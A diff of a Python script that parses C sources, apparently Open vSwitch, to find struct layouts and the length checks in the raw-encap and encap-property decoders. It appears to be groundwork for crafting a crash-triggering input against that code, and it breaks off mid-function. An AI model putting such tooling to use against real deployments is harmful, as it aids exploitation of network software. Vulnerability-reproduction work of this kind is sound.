@@ -1,88 +1,264 @@
 import os
 import re
-import ast
 import tarfile
 import tempfile
 import shutil
 import struct
-from typing import Dict, Optional, List, Tuple, Any
-
-
-def _align8(n: int) -> int:
-    return (n + 7) & ~7
-
-
-def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
-    with tarfile.open(tar_path, "r:*") as tf:
-        for m in tf.getmembers():
-            name = m.name
-            if not name or name.startswith("/") or ".." in name.split("/"):
-                continue
-            tf.extract(m, dst_dir)
-
-
-def _read_file_bytes(path: str, max_size: int = 2_500_000) -> Optional[bytes]:
-    try:
-        st = os.stat(path)
-        if st.st_size > max_size:
-            return None
-        with open(path, "rb") as f:
-            return f.read()
-    except Exception:
-        return None
-
-
-def _read_file_text(path: str, max_size: int = 2_500_000) -> Optional[str]:
-    b = _read_file_bytes(path, max_size=max_size)
-    if b is None:
-        return None
-    try:
-        return b.decode("utf-8", errors="ignore")
-    except Exception:
-        return None
+import ast
+from typing import Dict, Optional, Tuple, List, Any
 
 
 def _strip_c_comments(s: str) -> str:
-    s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
-    s = re.sub(r"//.*?$", "", s, flags=re.MULTILINE)
+    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
+    s = re.sub(r"//.*", "", s)
     return s
 
 
-def _find_files(root: str, exts: Tuple[str, ...] = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp")) -> List[str]:
-    out = []
-    for dp, _, fns in os.walk(root):
-        for fn in fns:
-            if fn.lower().endswith(exts):
-                out.append(os.path.join(dp, fn))
-    return out
+def _clean_c_expr(expr: str) -> str:
+    expr = expr.strip()
+    expr = expr.split("\n", 1)[0].strip()
+    expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S).strip()
+    expr = re.sub(r"//.*", "", expr).strip()
+
+    expr = re.sub(r"\b(UINT|INT)(8|16|32|64)_C\s*\(\s*([^)]+)\s*\)", r"(\3)", expr)
+    expr = re.sub(r"\bUINTPTR_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)
+    expr = re.sub(r"\bUINTMAX_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)
+
+    expr = re.sub(r"\(\s*(const\s+)?(unsigned\s+)?(signed\s+)?(long\s+long|long|short|int|char|size_t|uint\d+_t|int\d+_t|uintptr_t|uintmax_t|uint64_t|uint32_t|uint16_t|uint8_t|ovs_be\d+|ovs_16aligned_be\d+)\s*\)", "", expr)
+
+    expr = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)(ULL|LL|UL|LU|U|L)\b", "", expr)
+    expr = re.sub(r"(?<=\b\d+)(ULL|LL|UL|LU|U|L)\b", "", expr)
+
+    expr = expr.replace("/", "//")
+    return expr.strip()
 
 
-def _find_files_containing(root: str, needle: bytes, exts: Tuple[str, ...] = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp")) -> List[str]:
-    out = []
-    for dp, _, fns in os.walk(root):
+class _ExprEval(ast.NodeVisitor):
+    def __init__(self, names: Dict[str, int]):
+        self.names = names
+
+    def visit_Expression(self, node: ast.Expression) -> int:
+        return self.visit(node.body)
+
+    def visit_Constant(self, node: ast.Constant) -> int:
+        if isinstance(node.value, bool):
+            return int(node.value)
+        if isinstance(node.value, int):
+            return int(node.value)
+        raise ValueError("unsupported constant")
+
+    def visit_Num(self, node: ast.Num) -> int:  # pragma: no cover
+        return int(node.n)
+
+    def visit_Name(self, node: ast.Name) -> int:
+        if node.id in self.names:
+            return int(self.names[node.id])
+        raise KeyError(node.id)
+
+    def visit_UnaryOp(self, node: ast.UnaryOp) -> int:
+        v = self.visit(node.operand)
+        if isinstance(node.op, ast.UAdd):
+            return +v
+        if isinstance(node.op, ast.USub):
+            return -v
+        if isinstance(node.op, ast.Invert):
+            return ~v
+        raise ValueError("unsupported unary op")
+
+    def visit_BinOp(self, node: ast.BinOp) -> int:
+        a = self.visit(node.left)
+        b = self.visit(node.right)
+        if isinstance(node.op, ast.Add):
+            return a + b
+        if isinstance(node.op, ast.Sub):
+            return a - b
+        if isinstance(node.op, ast.Mult):
+            return a * b
+        if isinstance(node.op, (ast.Div, ast.FloorDiv)):
+            if b == 0:
+                raise ZeroDivisionError
+            return a // b
+        if isinstance(node.op, ast.Mod):
+            if b == 0:
+                raise ZeroDivisionError
+            return a % b
+        if isinstance(node.op, ast.LShift):
+            return a << b
+        if isinstance(node.op, ast.RShift):
+            return a >> b
+        if isinstance(node.op, ast.BitOr):
+            return a | b
+        if isinstance(node.op, ast.BitAnd):
+            return a & b
+        if isinstance(node.op, ast.BitXor):
+            return a ^ b
+        raise ValueError("unsupported bin op")
+
+    def generic_visit(self, node: ast.AST) -> int:
+        raise ValueError(f"unsupported AST node: {type(node).__name__}")
+
+
+def _try_eval_int(expr: str, names: Dict[str, int]) -> Optional[int]:
+    expr = _clean_c_expr(expr)
+    if not expr:
+        return None
+    try:
+        node = ast.parse(expr, mode="eval")
+        return int(_ExprEval(names).visit(node))
+    except Exception:
+        return None
+
+
+def _safe_extract_tar(tar_path: str, out_dir: str) -> None:
+    with tarfile.open(tar_path, "r:*") as tf:
+        members = tf.getmembers()
+        out_real = os.path.realpath(out_dir)
+        safe_members = []
+        for m in members:
+            name = m.name
+            if name.startswith("/") or name.startswith("\\"):
+                continue
+            dest = os.path.realpath(os.path.join(out_dir, name))
+            if not (dest == out_real or dest.startswith(out_real + os.sep)):
+                continue
+            safe_members.append(m)
+        tf.extractall(out_dir, members=safe_members)
+
+
+def _pick_project_root(extract_dir: str) -> str:
+    entries = [e for e in os.listdir(extract_dir) if not e.startswith(".")]
+    if len(entries) == 1:
+        p = os.path.join(extract_dir, entries[0])
+        if os.path.isdir(p):
+            return p
+    return extract_dir
+
+
+def _iter_source_files(root: str) -> List[str]:
+    res = []
+    skip_dirs = {".git", "build", "Build", "out", "dist", "autom4te.cache", "__pycache__"}
+    for dp, dns, fns in os.walk(root):
+        dns[:] = [d for d in dns if d not in skip_dirs and not d.startswith(".")]
         for fn in fns:
-            if not fn.lower().endswith(exts):
+            if not (fn.endswith(".c") or fn.endswith(".h")):
                 continue
             p = os.path.join(dp, fn)
-            b = _read_file_bytes(p)
-            if b is None:
+            try:
+                st = os.stat(p)
+            except OSError:
                 continue
-            if needle in b:
-                out.append(p)
+            if st.st_size > 6_000_000:
+                continue
+            res.append(p)
+    return res
+
+
+def _file_contains(p: str, needle: str) -> bool:
+    try:
+        with open(p, "rb") as f:
+            data = f.read()
+        return needle.encode("utf-8") in data
+    except Exception:
+        return False
+
+
+def _find_files_containing(root: str, needle: str, limit: int = 50) -> List[str]:
+    out = []
+    for p in _iter_source_files(root):
+        if _file_contains(p, needle):
+            out.append(p)
+            if len(out) >= limit:
+                break
     return out
 
 
-def _find_function_body(text: str, func_name: str) -> Optional[str]:
+def _parse_defines_and_enums_from_text(text: str, define_exprs: Dict[str, str], consts: Dict[str, int]) -> None:
+    text_nc = _strip_c_comments(text)
+
+    for m in re.finditer(r"^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(.+)$", text_nc, flags=re.M):
+        name = m.group(1)
+        rhs = m.group(2).strip()
+        rhs = rhs.split("\\", 1)[0].strip()
+        rhs = rhs.strip()
+        if "(" in name:
+            continue
+        if name not in define_exprs and name not in consts:
+            define_exprs[name] = rhs
+
+    for em in re.finditer(r"\benum\b[^;{]*\{", text_nc):
+        start = em.end() - 1
+        i = start
+        depth = 0
+        while i < len(text_nc):
+            c = text_nc[i]
+            if c == "{":
+                depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    end = i
+                    break
+            i += 1
+        else:
+            continue
+
+        body = text_nc[start + 1:end]
+        parts = [p.strip() for p in body.split(",") if p.strip()]
+        cur_val = None
+        for part in parts:
+            part = part.strip()
+            if not part:
+                continue
+            if "=" in part:
+                n, ex = part.split("=", 1)
+                n = n.strip()
+                ex = ex.strip()
+                v = _try_eval_int(ex, consts)
+                if v is None:
+                    v = _try_eval_int(ex, {**consts, **{}})
+                if v is not None:
+                    consts[n] = int(v)
+                    cur_val = int(v)
+                else:
+                    define_exprs.setdefault(n, ex)
+                    cur_val = None
+            else:
+                n = part.split()[0].strip()
+                if cur_val is None:
+                    cur_val = 0 if n not in consts else consts[n]
+                else:
+                    cur_val += 1
+                if n not in consts:
+                    consts[n] = int(cur_val)
+
+
+def _resolve_define_exprs(define_exprs: Dict[str, str], consts: Dict[str, int], max_rounds: int = 40) -> None:
+    for _ in range(max_rounds):
+        progress = False
+        for k, expr in list(define_exprs.items()):
+            if k in consts:
+                define_exprs.pop(k, None)
+                progress = True
+                continue
+            v = _try_eval_int(expr, consts)
+            if v is not None:
+                consts[k] = int(v)
+                define_exprs.pop(k, None)
+                progress = True
+        if not progress:
+            break
+
+
+def _find_function_body_in_text(text: str, func_name: str) -> Optional[str]:
     idx = text.find(func_name)
     if idx < 0:
         return None
     brace = text.find("{", idx)
     if brace < 0:
         return None
-    depth = 0
     i = brace
-    n = len(text)
-    while i < n:
+    depth = 0
+    while i < len(text):
         c = text[i]
         if c == "{":
             depth += 1
@@ -94,707 +270,513 @@ def _find_function_body(text: str, func_name: str) -> Optional[str]:
     return None
 
 
-_ALLOWED_AST_NODES = (
-    ast.Expression,
-    ast.BinOp,
-    ast.UnaryOp,
-    ast.Constant,
-    ast.Num,
-    ast.Add,
-    ast.Sub,
-    ast.Mult,
-    ast.FloorDiv,
-    ast.Div,
-    ast.Mod,
-    ast.LShift,
-    ast.RShift,
-    ast.BitOr,
-    ast.BitAnd,
-    ast.BitXor,
-    ast.Invert,
-    ast.UAdd,
-    ast.USub,
-    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.Expression,
-)
-
-
-def _safe_eval_expr(expr: str) -> Optional[int]:
-    try:
-        tree = ast.parse(expr, mode="eval")
-    except Exception:
-        return None
-    for node in ast.walk(tree):
-        if not isinstance(node, _ALLOWED_AST_NODES):
-            return None
-    try:
-        val = eval(compile(tree, "<cexpr>", "eval"), {"__builtins__": {}}, {})
-    except Exception:
-        return None
-    try:
-        return int(val)
-    except Exception:
-        return None
-
-
-_CAST_RE = re.compile(
-    r"\(\s*(?:const\s+)?(?:unsigned\s+|signed\s+)?(?:long\s+|short\s+|int\s+|char\s+|bool\s+|size_t\s+|ptrdiff_t\s+|"
-    r"u?int(?:8|16|32|64)_t|ovs_(?:be|le)(?:16|32|64)|enum\s+[A-Za-z_]\w*)\s*\)"
-)
-
-
-def _normalize_c_expr(expr: str) -> str:
-    expr = expr.strip()
-    expr = re.sub(r"\bUINT(?:8|16|32|64)_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
-    expr = re.sub(r"\bINT(?:8|16|32|64)_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
-    expr = re.sub(r"\bUINTMAX_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
-    expr = re.sub(r"\bINTMAX_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)
-    expr = _CAST_RE.sub("", expr)
-    expr = re.sub(r"(\b0x[0-9A-Fa-f]+|\b\d+)([uUlL]+)\b", r"\1", expr)
-    return expr
-
-
-_IDENT_RE = re.compile(r"\b[A-Za-z_]\w*\b")
-
-
-def _subst_idents(expr: str, values: Dict[str, int]) -> str:
-    def repl(m: re.Match) -> str:
-        name = m.group(0)
-        if name in values:
-            return str(values[name])
-        return name
-    return _IDENT_RE.sub(repl, expr)
-
-
-class _ConstResolver:
-    def __init__(self) -> None:
-        self.values: Dict[str, int] = {}
-        self.pending: Dict[str, str] = {}
-
-    def add_value(self, name: str, val: int) -> None:
-        if name not in self.values:
-            self.values[name] = int(val)
-
-    def add_expr(self, name: str, expr: str) -> None:
-        if name in self.values:
-            return
-        expr = expr.strip()
-        if not expr:
-            return
-        self.pending[name] = expr
-
-    def resolve_all(self, max_rounds: int = 1000) -> None:
-        for _ in range(max_rounds):
-            progress = False
-            for k in list(self.pending.keys()):
-                expr = _normalize_c_expr(self.pending[k])
-                expr2 = _subst_idents(expr, self.values)
-                if "sizeof" in expr2:
-                    continue
-                if re.search(r"\b[A-Za-z_]\w*\b", expr2):
-                    unresolved = False
-                    for ident in set(_IDENT_RE.findall(expr2)):
-                        if ident in ("sizeof",):
-                            unresolved = True
-                            break
-                        if ident not in self.values and not re.fullmatch(r"\d+", ident) and not ident.startswith("0x"):
-                            unresolved = True
-                            break
-                    if unresolved:
-                        continue
-                val = _safe_eval_expr(expr2)
-                if val is None:
-                    continue
-                self.values[k] = int(val)
-                del self.pending[k]
-                progress = True
-            if not progress:
-                break
-
-    def get(self, name: str) -> Optional[int]:
-        if name in self.values:
-            return self.values[name]
-        if name in self.pending:
-            self.resolve_all()
-        return self.values.get(name)
-
-
-def _parse_defines(text: str, resolver: _ConstResolver) -> None:
-    t = _strip_c_comments(text)
-    for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", t):
-        name = m.group(1)
-        if "(" in name:
+def _find_struct_body(root: str, struct_name: str) -> Optional[str]:
+    candidates = _find_files_containing(root, f"struct {struct_name}")
+    pat = re.compile(r"\bstruct\s+" + re.escape(struct_name) + r"\b")
+    for p in candidates:
+        try:
+            with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                t = f.read()
+        except Exception:
             continue
-        val = m.group(2).strip()
-        if not val or val.startswith("(") and val.endswith(")") and len(val) <= 2:
-            continue
-        val = val.split("\\")[0].strip()
-        if re.match(r"^[0-9]+$", val) or re.match(r"^0x[0-9A-Fa-f]+$", val):
-            resolver.add_value(name, int(val, 0))
-        else:
-            resolver.add_expr(name, val)
-
-
-def _split_top_level_commas(s: str) -> List[str]:
-    parts = []
-    cur = []
-    depth_par = 0
-    depth_br = 0
-    for ch in s:
-        if ch == "(":
-            depth_par += 1
-        elif ch == ")":
-            depth_par = max(0, depth_par - 1)
-        elif ch == "[":
-            depth_br += 1
-        elif ch == "]":
-            depth_br = max(0, depth_br - 1)
-        if ch == "," and depth_par == 0 and depth_br == 0:
-            parts.append("".join(cur))
-            cur = []
-        else:
-            cur.append(ch)
-    if cur:
-        parts.append("".join(cur))
-    return parts
-
-
-def _parse_enums(text: str, resolver: _ConstResolver) -> None:
-    t = _strip_c_comments(text)
-    i = 0
-    n = len(t)
-    while True:
-        m = re.search(r"\benum\b", t[i:])
+        m = pat.search(t)
         if not m:
-            break
-        start = i + m.start()
-        brace = t.find("{", start)
-        if brace < 0:
-            i = start + 4
             continue
-        depth = 0
-        j = brace
-        while j < n:
-            if t[j] == "{":
-                depth += 1
-            elif t[j] == "}":
-                depth -= 1
-                if depth == 0:
-                    block = t[brace + 1:j]
-                    entries = _split_top_level_commas(block)
-                    cur_val = -1
-                    for ent in entries:
-                        ent = ent.strip()
-                        if not ent:
-                            continue
-                        mm = re.match(r"^([A-Za-z_]\w*)\s*(?:=\s*(.+))?$", ent, flags=re.DOTALL)
-                        if not mm:
-                            continue
-                        name = mm.group(1)
-                        expr = mm.group(2)
-                        if expr is None:
-                            cur_val += 1
-                            resolver.add_value(name, cur_val)
-                        else:
-                            expr = expr.strip()
-                            expr_n = _normalize_c_expr(expr)
-                            expr_n = _subst_idents(expr_n, resolver.values)
-                            val = _safe_eval_expr(expr_n)
-                            if val is not None:
-                                cur_val = val
-                                resolver.add_value(name, cur_val)
-                            else:
-                                resolver.add_expr(name, expr)
-                                cur_val += 1
-                    i = j + 1
-                    break
-            j += 1
-        else:
-            i = brace + 1
-
-
-_TYPE_SIZES: Dict[str, int] = {
-    "uint8_t": 1,
-    "int8_t": 1,
-    "char": 1,
-    "unsigned char": 1,
-    "int16_t": 2,
-    "uint16_t": 2,
-    "ovs_be16": 2,
-    "ovs_le16": 2,
-    "int32_t": 4,
-    "uint32_t": 4,
-    "ovs_be32": 4,
-    "ovs_le32": 4,
-    "int64_t": 8,
-    "uint64_t": 8,
-    "ovs_be64": 8,
-    "ovs_le64": 8,
-    "struct ofp_action_header": 4,
-    "struct ofp_action_experimenter_header": 8,
-    "struct ofp_action_vendor_header": 8,
-}
-
-
-def _clean_type(ty: str) -> str:
-    ty = ty.strip()
-    ty = re.sub(r"\bconst\b", "", ty)
-    ty = re.sub(r"\bvolatile\b", "", ty)
-    ty = re.sub(r"\s+", " ", ty).strip()
-    ty = ty.replace(" *", "*").replace("* ", "*")
-    return ty
-
-
-def _eval_array_dim(dim: str, consts: _ConstResolver) -> Optional[int]:
-    dim = dim.strip()
-    if dim == "":
-        return None
-    if dim == "0":
-        return 0
-    dim = _normalize_c_expr(dim)
-    dim = _subst_idents(dim, consts.values)
-    v = _safe_eval_expr(dim)
-    return v
-
-
-def _extract_struct_blocks(text: str) -> Dict[str, str]:
-    t = _strip_c_comments(text)
-    blocks: Dict[str, str] = {}
-    for m in re.finditer(r"\bstruct\s+([A-Za-z_]\w*)\s*\{", t):
-        name = m.group(1)
-        brace = t.find("{", m.end() - 1)
+        brace = t.find("{", m.end())
         if brace < 0:
             continue
-        depth = 0
         i = brace
-        n = len(t)
-        while i < n:
-            if t[i] == "{":
+        depth = 0
+        while i < len(t):
+            c = t[i]
+            if c == "{":
                 depth += 1
-            elif t[i] == "}":
+            elif c == "}":
                 depth -= 1
                 if depth == 0:
-                    body = t[brace + 1:i]
-                    blocks[name] = body
+                    end = i
+                    tail = t[end:end + 5]
+                    if "};" in tail:
+                        return t[brace + 1:end]
+                    j = t.find(";", end, end + 50)
+                    if j != -1:
+                        return t[brace + 1:end]
                     break
             i += 1
-    return blocks
+    return None
 
 
-def _parse_struct_layout_from_body(body: str, consts: _ConstResolver) -> Tuple[int, List[Tuple[str, int, int]]]:
-    # Returns (size, [(field_name, offset, size)])
-    # Stops at first flexible array member.
-    statements = [s.strip() for s in body.split(";")]
+def _normalize_ctype(ctype: str) -> str:
+    ctype = ctype.strip()
+    ctype = re.sub(r"\bconst\b", "", ctype)
+    ctype = re.sub(r"\bvolatile\b", "", ctype)
+    ctype = re.sub(r"\bregister\b", "", ctype)
+    ctype = re.sub(r"\s+", " ", ctype).strip()
+    return ctype
+
+
+def _sizeof_ctype(ctype: str, struct_sizes: Dict[str, int]) -> Optional[int]:
+    ctype = _normalize_ctype(ctype)
+    if "*" in ctype:
+        return None
+    builtin = {
+        "uint8_t": 1,
+        "int8_t": 1,
+        "char": 1,
+        "signed char": 1,
+        "unsigned char": 1,
+        "uint16_t": 2,
+        "int16_t": 2,
+        "short": 2,
+        "unsigned short": 2,
+        "uint32_t": 4,
+        "int32_t": 4,
+        "int": 4,
+        "unsigned int": 4,
+        "uint64_t": 8,
+        "int64_t": 8,
+        "long long": 8,
+        "unsigned long long": 8,
+        "ovs_be16": 2,
+        "ovs_be32": 4,
+        "ovs_be64": 8,
+        "ovs_16aligned_be32": 4,
+        "ovs_16aligned_be64": 8,
+        "ofp_port_t": 4,
+    }
+    if ctype in builtin:
+        return builtin[ctype]
+    if ctype.startswith("struct "):
+        sn = ctype.split(None, 1)[1].strip()
+        if sn in struct_sizes:
+            return struct_sizes[sn]
+        return None
+    if ctype in struct_sizes:
+        return struct_sizes[ctype]
+    return None
+
+
+def _parse_struct_fields(body: str, consts: Dict[str, int], struct_sizes: Dict[str, int]) -> List[Tuple[str, str, int, int]]:
+    body_nc = _strip_c_comments(body)
+    body_nc = re.sub(r"^\s*#.*$", "", body_nc, flags=re.M)
+    stmts = [s.strip() for s in body_nc.split(";") if s.strip()]
+    fields = []
     off = 0
-    layout: List[Tuple[str, int, int]] = []
-
-    for st in statements:
-        if not st:
-            continue
-        st = re.sub(r"\bOVS_PACKED\b", "", st)
-        st = re.sub(r"__attribute__\s*\(\(.*?\)\)", "", st)
+    for st in stmts:
         st = st.strip()
         if not st:
             continue
-        if st.startswith("union ") or st.startswith("struct ") and "{" in st:
+        if st.startswith("union ") or st.startswith("enum ") or st.startswith("struct ") and "{" in st:
             continue
-        if st.startswith("enum ") and "{" in st:
-            continue
+        st = re.sub(r"\bOVS_PACKED\b", "", st)
+        st = re.sub(r"\bOVS_ALIGNED\(\s*\d+\s*\)\b", "", st)
+        st = st.strip()
 
-        m = re.match(r"^(.+?)\s+(.+)$", st, flags=re.DOTALL)
+        m = re.match(r"^(?P<type>.+?)\s+(?P<name>[A-Za-z_]\w*)\s*(?P<arr>\[[^\]]*\])?$", st)
         if not m:
             continue
-        ty = _clean_type(m.group(1))
-        decls = m.group(2).strip()
-        if not decls:
+        ctype = m.group("type").strip()
+        name = m.group("name").strip()
+        arr = m.group("arr")
+        size = _sizeof_ctype(ctype, struct_sizes)
+        if size is None:
+            continue
+        count = 1
+        if arr is not None:
+            a = arr.strip()[1:-1].strip()
+            if a == "" or a == "0":
+                break
+            v = _try_eval_int(a, consts)
+            if v is None:
+                v = 1
+            count = int(v)
+        fsize = size * count
+        fields.append((name, _normalize_ctype(ctype), fsize, off))
+        off += fsize
+    return fields
+
+
+def _compute_struct_size(root: str, struct_name: str, consts: Dict[str, int], cache: Dict[str, Any]) -> Optional[int]:
+    if struct_name in cache:
+        v = cache[struct_name]
+        if isinstance(v, int):
+            return v
+        if isinstance(v, dict) and "size" in v:
+            return int(v["size"])
+    body = _find_struct_body(root, struct_name)
+    if body is None:
+        return None
+    cache.setdefault(struct_name, {"size": None, "fields": None})
+    struct_sizes = {k: (v if isinstance(v, int) else v.get("size")) for k, v in cache.items() if isinstance(v, (int, dict))}
+    struct_sizes = {k: int(v) for k, v in struct_sizes.items() if isinstance(v, int)}
+    changed = True
+    for _ in range(20):
+        if not changed:
+            break
+        changed = False
+        fields = _parse_struct_fields(body, consts, struct_sizes)
+        ok = True
+        for _, ty, _, _ in fields:
+            if ty.startswith("struct "):
+                sn = ty.split(None, 1)[1].strip()
+                if sn not in struct_sizes:
+                    s = _compute_struct_size(root, sn, consts, cache)
+                    if s is not None:
+                        struct_sizes[sn] = int(s)
+                        changed = True
+                    else:
+                        ok = False
+        if ok:
+            size = 0
+            for _, _, fs, off in fields:
+                size = max(size, off + fs)
+            cache[struct_name] = {"size": int(size), "fields": fields}
+            return int(size)
+    return None
+
+
+def _get_struct_layout(root: str, struct_name: str, consts: Dict[str, int], cache: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+    s = _compute_struct_size(root, struct_name, consts, cache)
+    if s is None:
+        return None
+    v = cache.get(struct_name)
+    if isinstance(v, dict):
+        return v
+    return None
+
+
+def _find_field_offset_recursive(root: str, struct_name: str, consts: Dict[str, int], cache: Dict[str, Any], target_names: Tuple[str, ...], base_off: int = 0, depth: int = 0) -> Optional[int]:
+    if depth > 6:
+        return None
+    layout = _get_struct_layout(root, struct_name, consts, cache)
+    if not layout:
+        return None
+    for name, ty, fs, off in layout["fields"]:
+        if name in target_names:
+            return base_off + off
+        if ty.startswith("struct "):
+            sn = ty.split(None, 1)[1].strip()
+            r = _find_field_offset_recursive(root, sn, consts, cache, target_names, base_off + off, depth + 1)
+            if r is not None:
+                return r
+    return None
+
+
+def _extract_action_struct_name_from_decode(root: str) -> Optional[Tuple[str, str]]:
+    candidates = _find_files_containing(root, "decode_NXAST_RAW_ENCAP")
+    for p in candidates:
+        try:
+            with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                t = f.read()
+        except Exception:
+            continue
+        fb = _find_function_body_in_text(t, "decode_NXAST_RAW_ENCAP")
+        if not fb:
+            continue
+        m = re.search(r"\bconst\s+struct\s+([A-Za-z_]\w*raw_encap[A-Za-z_]\w*)\s*\*", fb)
+        if m:
+            return p, m.group(1)
+        m = re.search(r"\bconst\s+struct\s+([A-Za-z_]\w*)\s*\*[^;]*\braw_encap\b", fb)
+        if m:
+            return p, m.group(1)
+        return p, "nx_action_raw_encap"
+    candidates = _find_files_containing(root, "RAW_ENCAP")
+    for p in candidates:
+        if "ofp-actions" in os.path.basename(p):
+            return p, "nx_action_raw_encap"
+    return None
+
+
+def _extract_decode_ed_prop_info(root: str, consts: Dict[str, int]) -> Tuple[Optional[str], Optional[str], int, int]:
+    files = _find_files_containing(root, "decode_ed_prop")
+    for p in files:
+        try:
+            with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                t = f.read()
+        except Exception:
+            continue
+        fb = _find_function_body_in_text(t, "decode_ed_prop")
+        if not fb:
             continue
 
-        parts = _split_top_level_commas(decls)
-        for d in parts:
-            d = d.strip()
-            if not d:
-                continue
-            d = d.split("=")[0].strip()
-            # pointer?
-            if "*" in d and not re.search(r"\[[^\]]*\]", d):
-                continue
-            dm = re.match(r"^\s*(\*?\s*[A-Za-z_]\w*)\s*(?:\[\s*([^\]]*)\s*\])?\s*$", d)
-            if not dm:
-                continue
-            name = dm.group(1).replace("*", "").strip()
-            arr_dim = dm.group(2)
+        header_struct = None
+        var = None
+        m = re.search(r"(\w+)\s*->\s*type\b", fb)
+        if m:
+            var = m.group(1)
+            m2 = re.search(r"\bstruct\s+([A-Za-z_]\w*)\s*\*\s*" + re.escape(var) + r"\b", fb)
+            if m2:
+                header_struct = m2.group(1)
+        if not header_struct:
+            m = re.search(r"\bstruct\s+([A-Za-z_]\w*ed_prop[A-Za-z_]\w*)\s*\*\s*(\w+)\b", fb)
+            if m:
+                header_struct = m.group(1)
+                var = m.group(2)
 
-            base_ty = ty
-            if base_ty.startswith("struct ") or base_ty.startswith("enum "):
-                pass
-            size = _TYPE_SIZES.get(base_ty)
-            if size is None:
-                # common in ovs: "ovs_be16" etc already covered; maybe "ovs_u128" etc.
-                size = _TYPE_SIZES.get(base_ty.replace("struct ", "struct "))
-            if size is None:
-                continue
-
-            if arr_dim is not None:
-                dimv = _eval_array_dim(arr_dim, consts)
-                if dimv is None:
-                    continue
-                if dimv == 0:
-                    return off, layout
-                size_total = size * dimv
-                layout.append((name, off, size_total))
-                off += size_total
-            else:
-                layout.append((name, off, size))
-                off += size
-
-    return off, layout
+        if header_struct:
+            return p, header_struct, 0, 0
+        return p, None, 0, 0
+    return None, None, 0, 0
 
 
-def _choose_raw_encap_struct(struct_blocks: Dict[str, str]) -> Optional[str]:
-    candidates = []
-    for name, body in struct_blocks.items():
-        if "raw" in name.lower() and "encap" in name.lower():
-            b = body.lower()
-            if "vendor" in b and "subtype" in b and "len" in b and "type" in b:
-                candidates.append((name, len(body)))
-            else:
-                candidates.append((name, len(body)))
-    if not candidates:
-        return None
-    candidates.sort(key=lambda x: (-("vendor" in struct_blocks[x[0]].lower() and "subtype" in struct_blocks[x[0]].lower()), x[1]))
-    return candidates[0][0]
+def _choose_ed_prop_type_and_len(root: str, consts: Dict[str, int]) -> Tuple[int, int]:
+    ed_files = _find_files_containing(root, "decode_ed_prop")
+    if not ed_files:
+        for k in sorted(consts.keys()):
+            if k.startswith("NX_ED_PROP_") and all(x not in k for x in ("END", "PAD", "UNSPEC", "NONE")):
+                v = consts.get(k)
+                if isinstance(v, int) and v != 0:
+                    return int(v) & 0xFFFF, 8
+        return 1, 8
 
-
-def _choose_ed_prop_header_struct(struct_blocks: Dict[str, str]) -> Optional[str]:
     best = None
-    best_score = -1
-    for name, body in struct_blocks.items():
-        lname = name.lower()
-        if "ed" in lname and "prop" in lname and "header" in lname:
-            b = body.lower()
-            score = 0
-            if "type" in b:
-                score += 5
-            if "len" in b or "length" in b:
-                score += 5
-            if score > best_score:
-                best = name
-                best_score = score
-    return best
+    for p in ed_files[:10]:
+        try:
+            with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                t = f.read()
+        except Exception:
+            continue
+        fb = _find_function_body_in_text(t, "decode_ed_prop")
+        if not fb:
+            continue
+
+        cases = list(re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", fb))
+        for i, cm in enumerate(cases):
+            cname = cm.group(1)
+            if cname not in consts:
+                continue
+            if any(x in cname for x in ("END", "PAD", "NONE", "UNSPEC", "UNSPECIFIED")):
+                continue
+            cval = consts.get(cname)
+            if not isinstance(cval, int):
+                continue
+            if cval == 0:
+                continue
+            start = cm.end()
+            end = cases[i + 1].start() if i + 1 < len(cases) else len(fb)
+            blk = fb[start:end]
+
+            req = None
+            mins = []
+            for m in re.finditer(r"\blen\s*!=\s*(\d+)\b", blk):
+                v = int(m.group(1))
+                if v > 0:
+                    mins.append(v)
+            if mins:
+                req = min(mins)
+            else:
+                mins = []
+                for m in re.finditer(r"\blen\s*<\s*(\d+)\b", blk):
+                    v = int(m.group(1))
+                    if v > 0:
+                        mins.append(v)
+                if mins:
+                    req = max(mins)
+            if req is None:
+                req = 8
+            if req < 4:
+                req = 4
+            if req % 8 != 0:
+                req = ((req + 7) // 8) * 8
+            if req > 256:
+                continue
+
+            err_count = len(re.findall(r"\bOFPERR_", blk))
+            return_count = len(re.findall(r"\breturn\b", blk))
+            score = (err_count, return_count, req)
+            cand = (score, int(cval) & 0xFFFF, int(req))
+            if best is None or cand[0] < best[0]:
+                best = cand
+
+    if best:
+        return best[1], best[2]
+
+    for k in sorted(consts.keys()):
+        if k.startswith("NX_ED_PROP_") and all(x not in k for x in ("END", "PAD", "UNSPEC", "NONE")):
+            v = consts.get(k)
+            if isinstance(v, int) and v != 0:
+                return int(v) & 0xFFFF, 8
+    return 1, 8
 
 
-def _detect_input_mode(root: str) -> Tuple[str, bool]:
-    # returns (mode, has_version_prefix_for_actions)
-    # mode in {"actions", "message"}
-    fuzzer_files = _find_files_containing(root, b"LLVMFuzzerTestOneInput")
-    if not fuzzer_files:
-        # Some harnesses might not be libFuzzer; fallback based on presence of ofpacts_decode usage.
-        if _find_files_containing(root, b"ofpmsg_decode") or _find_files_containing(root, b"ofpraw_pull"):
-            return "message", False
-        return "actions", False
-
-    mode = "actions"
-    version_prefix = False
-
-    # Prefer a fuzzer that decodes actions directly if any.
-    for p in fuzzer_files:
-        t = _read_file_text(p) or ""
-        tl = t.lower()
